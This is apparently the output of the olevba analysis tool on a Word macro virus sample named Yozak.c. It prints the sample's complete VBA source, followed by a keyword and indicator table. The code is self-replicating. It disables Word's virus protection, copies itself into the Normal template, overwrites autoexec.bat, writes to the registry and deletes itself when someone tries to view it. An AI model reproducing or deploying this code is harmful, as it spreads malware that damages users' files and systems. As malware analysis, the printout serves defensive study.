olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Yozak.c-81b3f99ee544e54752fa517478208345ef6a6370
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Yozak.c-81b3f99ee544e54752fa517478208345ef6a6370 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Application.DisplayAlerts = wdAlertsNone
Application.EnableCancelKey = wdCancelDisabled
Dim ni As Boolean, ai As Boolean
If NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.Lines(3, 3) = "Options.VirusProtection = False" Then ni = True
If ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.Lines(3, 3) = "Options.VirusProtection = False" Then ai = True
x = VBE.ActiveVbproject.VBComponents("ThisDocument").CodeModule.Lines(1, 86)
If ni = True And ai = False Then
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromString x
ElseIf ni = False And ai = True Then
NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromString x
End If
Payloader
z = "R" & Int(2354365 * Rnd)
VBE.ActiveVbproject.VBComponents("ThisDocument").CodeModule.ReplaceLine 17, z
VBE.ActiveVbproject.VBComponents("ThisDocument").CodeModule.ReplaceLine 22, "Sub " & z & "()"
End Sub
Sub Payloader()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For x = 1 To Int(6000009 * Rnd)
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE", "Stupid") = "Free Vic."
Next x
Open "C:\autoexec.bat" For Output As F
Print F; "echo Free Vic."
Print F; "echo 3C supoorts you Vic."
Print F; "Echo All VX scene support you Vic."
Print F; "echo Free Vic."
CommandBars(Int(9 * Rnd)).Name = "-Free Vic.-"
End If
End Sub
Sub HelpAbout()
MsgBox "-Free Vic-", vbApplicationModal, "Yo"
End Sub
Sub ViewVbCode()
On Error Resume Next
MsgBox "-Free Vic-"
NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.deletelines 1, 86
NormalTemplate.Saved = False
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.deletelines 1, 86
Application.ShowVisualBasicEditor = True
End Sub
Sub FileSave()
On Error Resume Next
Randomize
If Month(Now) = Int(12 * Rnd) Then
MsgBox "-Free Vic-", vbCritical, "3C"
Selection.MoveStart
Selection.TypeText "WE use knowledge to create life."
Selection.TypeText "You use knowledge to kill life."
Selection.TypeText "And You call US criminals."
Selection.TypeText "You make drugs and YOU call US criminals"
Selection.TypeText "You make war and YOU call Us criminals"
Selection.TypeText "You let people die and YOU call US criminals"
Selection.TypeText "You use atomic energy for bombs and YOU call US criminals"
Selection.TypeText "You destroy the environment and YOU call US criminals"
Selection.TypeText "You spread disease and YOU call US criminals"
Selection.TypeText "You pedophilia and YOU call US criminals"
Selection.TypeText "YES we are CRIMINALS and our CRIME is to share"
Selection.TypeText "Our knowledge. But in comparison what you have DONE"
Selection.TypeText "WE are angels."
Selection.TypeText "Dr.yozak"
Selection.TypeText "It's the 3C way of thinking"
Selection.TypeText "-FREE VIC-"
Beep
MsgBox "Free Vic.", vbApplicationModal, "___________"
End If
ActiveDocument.Save
End Sub
Sub FileClose()
If Day(Now) = 1 Or Day(Now) = 30 Then
MsgBox "3C way of thinking", vbApplicationModal, ":P"
Open "c:\readme.txt" For Random As gr
Print gr; "It's the 3C way of thinking we are smoking blasting drinking."
Print gr; "free vic "
Print gr; "CCC-members.xoom.com/CCCriminals-CCC"
Close gr
MsgBox "Money or the Power"
MsgBox "Power or the Money"
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|environment         |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|kill                |May delete a file                            |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

